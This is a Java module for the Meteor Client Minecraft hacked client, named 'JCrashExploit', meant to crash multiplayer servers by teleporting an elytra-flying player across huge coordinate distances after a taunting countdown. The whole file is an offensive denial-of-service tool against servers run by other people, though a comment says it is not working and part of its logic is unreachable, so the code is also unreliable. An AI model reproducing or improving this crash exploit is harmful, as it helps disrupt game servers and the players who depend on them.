/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client).
 * Copyright (c) Meteor Development.
 */

package meteordevelopment.meteorclient.systems.modules.JJhack;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;

public class JTesting extends Module {
   // NOT WORKING
   public JTesting(){
      super(Categories.JJHACK, "JCrashExploit", "Crashes server with elytra, MAY CRASH YOUR MINECRAFT");
   }

    int tmpTick;
   @Override
   public void onActivate(){
   tmpTick = 0;
   }
   @EventHandler
   private void onTick(TickEvent.Post event){
      tmpTick++;
      if(tmpTick > 80) crash();
      switch (tmpTick) {
         case 20 -> warning("CRASHING SERVER IN 3");
         case 40 -> warning("CRASHING SERVER IN 2");
         case 60 -> warning("CRASHING SERVER IN 1");
         case 80 -> {
            warning("SAY BYE BYE TO YOUR SERVER");
            crash();
         }
      }
   }

   private void crash() {
      if (!mc.player.isFallFlying()) {
         info("You need to be flying with elytra");
         toggle();
      } else {
         if (tmpTick % 2 == 0) {
            if (tmpTick == 300) {
               toggle();
            }
            mc.player.setPosition(tmpTick * 200, 70, tmpTick * 100);
         }
      }
   }

}
